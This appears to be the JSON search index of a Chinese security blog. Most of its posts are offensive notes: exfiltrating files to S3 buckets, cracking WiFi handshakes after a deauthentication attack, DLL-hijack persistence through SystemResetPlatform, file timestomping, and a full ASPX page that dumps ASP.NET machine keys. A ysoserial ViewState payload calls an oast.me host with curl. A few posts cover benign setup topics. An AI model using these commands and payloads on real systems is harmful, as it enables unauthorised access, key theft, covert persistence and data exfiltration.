[{"content":"数据压缩 7Zip 将D:\\test文件夹压缩\n-p 参数设置密码为Secret\n-mhe=on 参数设置加密目录名和文件名\n-mx=5 平衡压缩速度与大小\n-bd 关闭进度条\n-bb0 关闭输出日志\n1 \u0026amp; \u0026#39;C:\\Program Files\\7-Zip\\7z.exe\u0026#39; a -pSecret -mhe=on -mx=5 -bd -bb0 D:\\test.7z D:\\test PowerShell 递归压缩 D:\\test 目录（包括子目录）\n1 Compress-Archive -Path \u0026#34;D:\\test\\*\u0026#34; -DestinationPath \u0026#34;D:\\test.zip\u0026#34; 数据外泄技术 Restic TODO\nBackBlaze (b2.exe) TODO\nS5cmd 保留目录层次结构并上传到存储桶\n1 s5cmd cp D:\\test \u0026#39;s3://bucket/test/\u0026#39; 将单个文件上传到存储桶\n1 s5cmd cp D:\\test.zip \u0026#39;s3://bucket/test.zip\u0026#39; 将文件后缀为doc和zip的文件上传到存储桶\n1 s5cmd cp --include \u0026#34;*.doc\u0026#34; --include \u0026#34;*.zip\u0026#34; D:\\test \u0026#39;s3://bucket/test/\u0026#39; ","date":"2025-09-02T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E6%95%B0%E6%8D%AE%E5%A4%96%E6%B3%84%E6%8A%80%E6%9C%AF/","title":"数据外泄技术"},{"content":"主要步骤\n1、发现wifi\n2、握手捕获\n3、密码破解\n4、访问验证\n发现wifi 开启监控模式\n1 sudo airmon-ng start wlan0 扫描可用WiFi airodump 扫描可用wifi\n1 sudo airodump-ng wlan0mon -c 1 -w WPA 取消身份认证攻击 执行取消身份验证攻击\n1 sudo aireplay-ng -0 5 -a 80:2D:BF:FE:13:83 -c 8A:00:A9:9B:ED:1A wlan0 密码破解 接下来，使用hashcat进行密码，破解。首先需要转换为hashcat可接受的格式\n1 hcxpcapngtool -o hash wpa-Induction.pcap 保存后，查看hash文件是否符合预期\n1 cat hash 使用密码字典进行暴力破解\n1 hashcat -m 22000 --force hash /opt/wordlist.txt 一旦破解成功，下面的命令将展示破解后的密码和哈希\n1 hashcat -m 22000 --force hash /opt/wordlist.txt --show 使用One进行破解密码\n1 hashcat -m 22000 hackme_hash /opt/wordlist.txt -r /usr/share/hashcat/rules/ 使用自定义规则破解密码\n1 2 3 4 5 6 T1ss$sbBZ3 将第二个字符大写 将s替换为$ 将b大写 重复最后3个字符 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ?s ?l ?u ?l ?d ?l ?a?a ?s?l?u?l?d?l?a?a 破解名为“HackTheWifi”的Wi-Fi网络。密码长度为8到16个字符，前四个字符为“B4ll”，其余字符为小写ASCII字母。 hashcat -a 3 -m 22000 htb_hash2 --increment --increment-min 8 --increment-max=14 \u0026#39;B4ll?l?l?l?l?l?l?l?l?l?l\u0026#39; Windows下调用GPU破解\n1 .\\hashcat.exe --backend-ignore-cuda -w 3 -m 22000 -a 6 ..\\hash.txt ..\\wordlist.txt ?d?d?d?d ","date":"2025-08-31T00:00:00Z","permalink":"https://yutianovo.github.com/p/wifi-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","title":"WIFI 密码破解"},{"content":"whwlsfb/ViewState-Cracker: ASP.net ViewState密钥被动扫描爆破BurpSuite插件\nhttps://github.com/whwlsfb/ViewState-Cracker\n","date":"2025-08-14T00:00:00Z","permalink":"https://yutianovo.github.com/p/burp-%E6%8F%92%E4%BB%B6/","title":"burp 插件"},{"content":"1、当看到\u0026quot;让我们将您连接到网络时\u0026quot;\n2、按 Shift + F10 打开命令提示符\n3、输入start ms-cxh:localonly并按 Enter\n","date":"2025-08-09T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E5%AE%89%E8%A3%85-windows-%E6%97%B6%E7%BB%95%E8%BF%87%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7%E8%AF%B7%E6%B1%82/","title":"安装 Windows 时绕过创建账户请求"},{"content":"系统和软件包自动换源 1 2 curl -LO https://gitee.com/RubyMetric/chsrc/releases/download/pre/chsrc_latest-1_amd64.deb sudo sudo dpkg -i chsrc_latest-1_amd64.deb docker 1 2 3 4 curl https://get.docker.com/ | sh # 换源（可选） sudo chsrc set dockerhub go 1 2 3 4 5 6 7 8 9 10 11 12 #!/bin/bash set -e # Install snap if missing if ! command -v snap \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;Installing snap...\u0026#34; sudo apt update \u0026amp;\u0026amp; sudo apt install snapd -y fi # Install latest Go via snap sudo snap install --classic go # Add Go to PATH for current session export PATH=$PATH:/snap/bin echo \u0026#34;✅ Go installed: $(go version)\u0026#34; projectdiscovery 1 2 go install -v github.com/projectdiscovery/pdtm/cmd/pdtm@latest pdtm -ia gowitness 1 go install github.com/sensepost/gowitness@latest 1 gowitness scan file -f targets.txt --threads 5 --write-db ","date":"2025-08-09T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E7%8E%AF%E5%A2%83%E5%88%9D%E5%A7%8B%E5%8C%96/","title":"环境初始化"},{"content":"在使用 VMware 虚拟化运行 Linux 系统时，很多人可能遇到这样的问题：\n明明在虚拟机里删了大文件，宿主机的硬盘空间却一点没少。\n甚至点击 VMware 设置中的“碎片整理”或“压缩”按钮也没效果？那你可能忽略了一个关键步骤。\n问题现象 虚拟机中删除了大量文件，比如日志、临时数据等。 虚拟机显示磁盘空间已经释放。 宿主机中 .vmdk 文件大小不变，磁盘占用未减少。\n这是因为：删除文件只是释放了文件系统中的“引用”，但磁盘空间在底层并未真正“清空”或“重写”。 解决方法一 在开机后执行以下命令，过程可能变慢，耐心等待。\n1 sudo vmware-toolbox-cmd disk shrink / 执行前的效果\n虚拟机\n宿主机\n执行之后\n解决方法二 1 2 3 sudo dd if=/dev/zero of=zero.fill bs=1M sudo sync sudo rm -f zero.fill 完成后，关机点击压缩\n效果\n","date":"2025-08-06T00:00:00Z","permalink":"https://yutianovo.github.com/p/vmware-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%A0%E9%99%A4%E5%A4%A7%E6%96%87%E4%BB%B6%E5%90%8E%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%A9%BA%E9%97%B4%E4%B8%8D%E9%87%8A%E6%94%BE%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","title":"VMware 虚拟机删除大文件后宿主机空间不释放解决方法"},{"content":"下载地址：https://github.com/yutianqaq/SharpFileTimeSetter\n简介 用于自定义文件时间属性，实现文件属性获取与自定义创建、修改、访问时间。\n还可以与同步指定文件的时间属性\n帮助 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 SharpFileTimeSetter.exe --help Usage: SharpSharpFileTimeSetter --file \u0026lt;path\u0026gt; [--get] [--creation \u0026lt;date\u0026gt;] [--modification \u0026lt;date\u0026gt;] [--access \u0026lt;date\u0026gt;] SharpFileTimeSetter --sync \u0026lt;sourceFile\u0026gt; \u0026lt;targetFile\u0026gt; Example: SharpFileTimeSetter --file test.txt --creation \u0026#34;2025-01-01 12:00:00\u0026#34; --modification \u0026#34;2025-01-02 14:00:00\u0026#34; SharpFileTimeSetter --file test.txt --get SharpFileTimeSetter --sync source.txt target.txt Arguments: --file Path to the target file (required). --get Get the current creation, modification, and access time of the file. --creation Creation time to set (optional, format: yyyy-MM-dd HH:mm:ss). --modification Modification time to set (optional, format: yyyy-MM-dd HH:mm:ss). --access Access time to set (optional, format: yyyy-MM-dd HH:mm:ss). --sync Synchronize time properties from source file to target file. \u0026lt;sourceFile\u0026gt; Source file whose time will be copied. \u0026lt;targetFile\u0026gt; Target file whose time will be updated. 例子 创建测试文件\n1 echo test \u0026gt; test 获取文件时间属性\n1 2 3 4 5 SharpFileTimeSetter.exe --file test --get File: test Creation Time: 2025/1/25 13:17:58 Modification Time: 2025/1/25 13:17:58 Access Time: 2025/1/25 13:17:58 修改文件属性\n1 2 3 4 5 SharpFileTimeSetter.exe --file test --creation \u0026#34;1999-09-09 12:00:00\u0026#34; --modification \u0026#34;1999-09-09 12:00:00\u0026#34; --access \u0026#34;1999-09-09 12:00:00\u0026#34; Creation time set to 1999/9/9 12:00:00. Modification time set to 1999/9/9 12:00:00. Access time set to 1999/9/9 12:00:00. File time properties updated successfully. 检查修改后的属性\n同步指定文件的时间属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # 创建测试文件 PS D:\\bin\\Debug\u0026gt; echo test2 \u0026gt; test2 PS D:\\bin\\Debug\u0026gt; .\\SharpFileTimeSetter.exe --file test2 --get File: test2 Creation Time: 2025/1/25 13:22:20 Modification Time: 2025/1/25 13:22:20 Access Time: 2025/1/25 13:22:20 # 将文件 test 的时间属性同步给 test2 PS D:\\bin\\Debug\u0026gt; .\\SharpFileTimeSetter.exe --sync test test2 Synced times from source \u0026#39;test\u0026#39; to target \u0026#39;test2\u0026#39;. PS D:\\bin\\Debug\u0026gt; .\\SharpFileTimeSetter.exe --file test2 --get File: test2 Creation Time: 1999/9/9 12:00:00 Modification Time: 1999/9/9 12:00:00 Access Time: 2025/1/25 13:19:54 ","date":"2025-01-25T00:00:00Z","permalink":"https://yutianovo.github.com/p/sharpfiletimesetter-%E7%94%A8%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/","title":"SharpFileTimeSetter-用于自定义文件的时间属性"},{"content":"docs/docs/framework/install/dotnet-35-windows.md at main · dotnet/docs\nhttps://github.com/dotnet/docs/blob/main/docs/framework/install/dotnet-35-windows.md\n","date":"2025-01-25T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E5%9C%A8-windows-11-%E4%B8%AD%E5%AE%89%E8%A3%85-.net3.5/","title":"在 Windows 11 中安装 .net3.5"},{"content":" 1 2 3 4 5 md C:\\$SysReset\\Framework\\Stack\\ copy evil.dll C:\\$SysReset\\Framework\\Stack\\RjvPlatform.dll C:\\Windows\\System32\\SystemResetPlatform\\SystemResetPlatform.exe ","date":"2025-01-25T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E5%B7%A7-1/","title":"权限维持技巧-1"},{"content":"参考视频：https://www.youtube.com/watch?v=dnE7c0ELEH8\n参考文章：https://blog.networkchuck.com/posts/my-insane-blog-pipeline/\n","date":"2024-11-30T00:00:00Z","permalink":"https://yutianovo.github.com/p/%E4%BD%BF%E7%94%A8obsdian%E5%86%99%E6%96%87%E7%AB%A0%E5%B9%B6%E9%80%9A%E8%BF%87%E8%84%9A%E6%9C%AC%E5%8F%91%E5%B8%83%E5%88%B0hugo%E6%B5%8B%E8%AF%95/","title":"使用Obsdian写文章并通过脚本发布到Hugo测试"},{"content":"不会自动换行 打开 hugo 博客的文件夹，全局搜索 goldmark\n如果是 toml 格式，就改为下面的内容\n1 2 3 [goldmark.renderer] unsafe = true hardwraps = true yaml 格式\n1 2 3 4 markup: goldmark: renderer: hardWraps: true ","date":"2024-11-25T22:48:38+08:00","permalink":"https://yutianovo.github.com/p/hugo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98/","title":"Hugo 博客搭建时的问题"},{"content":"来到 Profile 选中订阅地址，点击右键选择 Open File 或者 Edit File\n在 proxies 上方新增如下内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 listeners: - name: mixed-in type: mixed port: 27891 listen: 127.0.0.1 proxy: proxies 中的 name 字段 - 美国节点 users: - admin: password - name: socks-in type: socks port: 27892 listen: 127.0.0.1 proxy: proxies 中的 name 字段 - 新加坡节点 - name: http-in type: http port: 27893 listen: 127.0.0.1 proxy: proxies 中的 name 字段 - 香港节点 [!note]\n当有 users 字段时将作为需认证的代理\nmixed 为将socks/http合并，socks 为仅限socks，http 为仅限 http\nname 需要唯一\nproxy 字段需要填写对应的 proxies 中的 name 字段\n以下配置将在本地启动一个节点，归属为香港，并开放同时支持 HTTP 和 SOCKS 协议的端口 17891\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 port: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: 127.0.0.1:9090 listeners: - name: mixed-in type: mixed port: 27891 listen: 127.0.0.1 proxy: \u0026#34;🇭🇰 港hk\u0026#34; proxies: - {name: 🇭🇰 港hk, server: ...[snip]... true} 完成后选择重启应用，当订阅更新时，配置将消失。\n","date":"2024-11-25T22:24:27+08:00","permalink":"https://yutianovo.github.com/p/clash-verge-%E5%B0%86%E8%AE%A2%E9%98%85%E4%B8%AD%E7%9A%84%E4%BB%A3%E7%90%86%E5%9C%B0%E5%9D%80%E4%BD%9C%E4%B8%BA%E5%8D%95%E4%B8%AA%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE/","title":"Clash Verge 将订阅中的代理地址作为单个端口开放"},{"content":"","date":"0001-01-01T00:00:00Z","permalink":"https://yutianovo.github.com/p/","title":""},{"content":"","date":"0001-01-01T00:00:00Z","permalink":"https://yutianovo.github.com/p/","title":""},{"content":"Machinekey获取 1、网站目录的 web.config 目录中可以读取到机器key\n2、通过注册表或反射的方式获取机器key\n代码源于：https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 \u0026lt;%@ Page Language=\u0026#34;C#\u0026#34; %\u0026gt; \u0026lt;% // Read https://soroush.secproject.com/blog/2019/05/danger-of-stealing-auto-generated-net-machine-keys/ Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;); byte[] autoGenKeyV4 = (byte[]) Microsoft.Win32.Registry.GetValue(\u0026#34;HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\ASP.NET\\\\4.0.30319.0\\\\\u0026#34;, \u0026#34;AutoGenKeyV4\u0026#34;, new byte[]{}); if(autoGenKeyV4!=null) Response.Write(\u0026#34;HKCU\\\\Software\\\\Microsoft\\\\ASP.NET\\\\4.0.30319.0\\\\AutoGenKeyV4: \u0026#34;+BitConverter.ToString(autoGenKeyV4).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); byte[] autoGenKey = (byte[]) Microsoft.Win32.Registry.GetValue(\u0026#34;HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\ASP.NET\\\\2.0.50727.0\\\\\u0026#34;, \u0026#34;AutoGenKey\u0026#34;, new byte[]{}); if(autoGenKey!=null) Response.Write(\u0026#34;HKCU\\\\Software\\\\Microsoft\\\\ASP.NET\\\\2.0.50727.0\\\\AutoGenKey: \u0026#34;+BitConverter.ToString(autoGenKey).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;); var systemWebAsm = System.Reflection.Assembly.Load(\u0026#34;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\u0026#34;); var machineKeySectionType = systemWebAsm.GetType(\u0026#34;System.Web.Configuration.MachineKeySection\u0026#34;); var getApplicationConfigMethod = machineKeySectionType.GetMethod(\u0026#34;GetApplicationConfig\u0026#34;, System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic); var config = (System.Web.Configuration.MachineKeySection)getApplicationConfigMethod.Invoke(null, new object[0]); Response.Write(\u0026#34;\u0026lt;b\u0026gt;ValidationKey:\u0026lt;/b\u0026gt; \u0026#34;+config.ValidationKey); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;DecryptionKey:\u0026lt;/b\u0026gt; \u0026#34;+ config.DecryptionKey); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;); var typeMachineKeyMasterKeyProvider = systemWebAsm.GetType(\u0026#34;System.Web.Security.Cryptography.MachineKeyMasterKeyProvider\u0026#34;); var instance = typeMachineKeyMasterKeyProvider.Assembly.CreateInstance( typeMachineKeyMasterKeyProvider.FullName, false, System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic, null, new object[] { config, null, null, null, null }, null, null); var validationKey = typeMachineKeyMasterKeyProvider.GetMethod(\u0026#34;GetValidationKey\u0026#34;).Invoke(instance, new object[0]); byte[] _validationKey = (byte[])validationKey.GetType().GetMethod(\u0026#34;GetKeyMaterial\u0026#34;).Invoke(validationKey, new object[0]); var encryptionKey = typeMachineKeyMasterKeyProvider.GetMethod(\u0026#34;GetEncryptionKey\u0026#34;).Invoke(instance, new object[0]); byte[] _decryptionKey = (byte[])validationKey.GetType().GetMethod(\u0026#34;GetKeyMaterial\u0026#34;).Invoke(encryptionKey, new object[0]); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;b\u0026gt;ASP.NET 4.5 and above:\u0026lt;/b\u0026gt;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;validationAlg:\u0026lt;/b\u0026gt; \u0026#34;+config.Validation); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;validationKey:\u0026lt;/b\u0026gt; \u0026#34;+BitConverter.ToString(_validationKey).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;decryptionAlg:\u0026lt;/b\u0026gt; \u0026#34;+config.Decryption); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;decryptionKey:\u0026lt;/b\u0026gt; \u0026#34;+BitConverter.ToString(_decryptionKey).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;hr/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026lt;b\u0026gt;ASP.NET 4.0 and below:\u0026lt;/b\u0026gt;\u0026lt;br/\u0026gt;\u0026#34;); byte[] autogenKeys = (byte[])typeof(HttpRuntime).GetField(\u0026#34;s_autogenKeys\u0026#34;, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static).GetValue(null); int validationKeySize = 64; int decryptionKeySize = 24; byte[] validationKeyAuto = new byte[validationKeySize]; byte[] decryptionKeyAuto = new byte[decryptionKeySize]; System.Buffer.BlockCopy(autogenKeys, 0, validationKeyAuto, 0, validationKeySize); System.Buffer.BlockCopy(autogenKeys, validationKeySize, decryptionKeyAuto, 0, decryptionKeySize); string appName = HttpRuntime.AppDomainAppVirtualPath; string appId = HttpRuntime.AppDomainAppId; Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;appName:\u0026lt;/b\u0026gt; \u0026#34;+appName); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;appId:\u0026lt;/b\u0026gt; \u0026#34;+appId); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;initial validationKey (not useful for direct use):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(validationKeyAuto).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); Response.Write(\u0026#34;\u0026lt;b\u0026gt;initial decryptionKey (not useful for direct use):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(decryptionKeyAuto).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); byte[] _validationKeyAutoAppSpecific = validationKeyAuto.ToArray(); int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName); _validationKeyAutoAppSpecific[0] = (byte)(dwCode3 \u0026amp; 0xff); _validationKeyAutoAppSpecific[1] = (byte)((dwCode3 \u0026amp; 0xff00) \u0026gt;\u0026gt; 8); _validationKeyAutoAppSpecific[2] = (byte)((dwCode3 \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16); _validationKeyAutoAppSpecific[3] = (byte)((dwCode3 \u0026amp; 0xff000000) \u0026gt;\u0026gt; 24); Response.Write(\u0026#34;\u0026lt;b\u0026gt;App specific ValidationKey (when uses IsolateApps):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(_validationKeyAutoAppSpecific).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); byte[] _validationKeyAutoAppIdSpecific = validationKeyAuto.ToArray(); int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId); _validationKeyAutoAppIdSpecific[4] = (byte)(dwCode4 \u0026amp; 0xff); _validationKeyAutoAppIdSpecific[5] = (byte)((dwCode4 \u0026amp; 0xff00) \u0026gt;\u0026gt; 8); _validationKeyAutoAppIdSpecific[6] = (byte)((dwCode4 \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16); _validationKeyAutoAppIdSpecific[7] = (byte)((dwCode4 \u0026amp; 0xff000000) \u0026gt;\u0026gt; 24); Response.Write(\u0026#34;\u0026lt;b\u0026gt;AppId Auto specific ValidationKey (when uses IsolateByAppId):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(_validationKeyAutoAppIdSpecific).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); byte[] _decryptionKeyAutoAutoAppSpecific = decryptionKeyAuto.ToArray(); //int dwCode3 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appName); _decryptionKeyAutoAutoAppSpecific[0] = (byte)(dwCode3 \u0026amp; 0xff); _decryptionKeyAutoAutoAppSpecific[1] = (byte)((dwCode3 \u0026amp; 0xff00) \u0026gt;\u0026gt; 8); _decryptionKeyAutoAutoAppSpecific[2] = (byte)((dwCode3 \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16); _decryptionKeyAutoAutoAppSpecific[3] = (byte)((dwCode3 \u0026amp; 0xff000000) \u0026gt;\u0026gt; 24); Response.Write(\u0026#34;\u0026lt;b\u0026gt;App specific DecryptionKey (when uses IsolateApps):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppSpecific).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); byte[] _decryptionKeyAutoAutoAppIdSpecific = decryptionKeyAuto.ToArray(); //int dwCode4 = StringComparer.InvariantCultureIgnoreCase.GetHashCode(appId); _decryptionKeyAutoAutoAppIdSpecific[4] = (byte)(dwCode4 \u0026amp; 0xff); _decryptionKeyAutoAutoAppIdSpecific[5] = (byte)((dwCode4 \u0026amp; 0xff00) \u0026gt;\u0026gt; 8); _decryptionKeyAutoAutoAppIdSpecific[6] = (byte)((dwCode4 \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16); _decryptionKeyAutoAutoAppIdSpecific[7] = (byte)((dwCode4 \u0026amp; 0xff000000) \u0026gt;\u0026gt; 24); Response.Write(\u0026#34;\u0026lt;b\u0026gt;AppId Auto specific DecryptionKey (when uses IsolateByAppId):\u0026lt;/b\u0026gt; \u0026#34;); Response.Write(BitConverter.ToString(_decryptionKeyAutoAutoAppIdSpecific).Replace(\u0026#34;-\u0026#34;, string.Empty)); Response.Write(\u0026#34;\u0026lt;br/\u0026gt;\u0026#34;); %\u0026gt; viewstate利用方式 命令执行 1 .\\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c \u0026#34;curl d2bn5pc4rqj9st6cq0agqg4xmr387gcgd.oast.me\u0026#34; --generator=\u0026#34;HEX\u0026#34; --validationkey=\u0026#34;validationkey\u0026#34; --decryptionkey=\u0026#34;decryptionkey\u0026#34; 代码执行 1 .\\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c \u0026#34;ExploitClass.cs;System.dll;System.Web.dll\u0026#34; --generator=\u0026#34;HEX\u0026#34; --validationkey=\u0026#34;validationkey\u0026#34; --decryptionkey=\u0026#34;decryptionkey\u0026#34; 参考 To find validation and decryption keys when AutoGenerate has been used in Machine Key settings\nhttps://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab\n利用.NET 反序列化做权限维持 | MYZXCG\nhttps://myzxcg.com/2021/11/%E5%88%A9%E7%94%A8.NET-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%81%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/\nMAR-251132.c1.v1 SharePoint 漏洞利用 | CISA\nhttps://www.cisa.gov/news-events/analysis-reports/ar25-218a\nNotSoSecure/Blacklist3r: project-blacklist3r\nhttps://github.com/NotSoSecure/Blacklist3r\n","date":"0001-01-01T00:00:00Z","permalink":"https://yutianovo.github.com/p/","title":""},{"content":"新闻类 Security Affairs - Read, think, share … Security is everyone\u0026rsquo;s responsibility\nhttps://securityaffairs.com/\nInfoStealers | 全方位的 Infostealers 中心。\nhttps://www.infostealers.com/\nGBHackers 新闻 - 排名第一的网络安全新闻平台\nhttps://gbhackers.com/\n织工蚁：追踪中国-Nexus 网络间谍行动\nhttps://www.sygnia.co/threat-reports-and-advisories/weaver-ant-tracking-a-china-nexus-cyber-espionage-operation/\n利用类 https://crackingx.com/\nhttps://github.com/Fadi002/MalwareInvestigation\n","date":"0001-01-01T00:00:00Z","permalink":"https://yutianovo.github.com/p/","title":""}]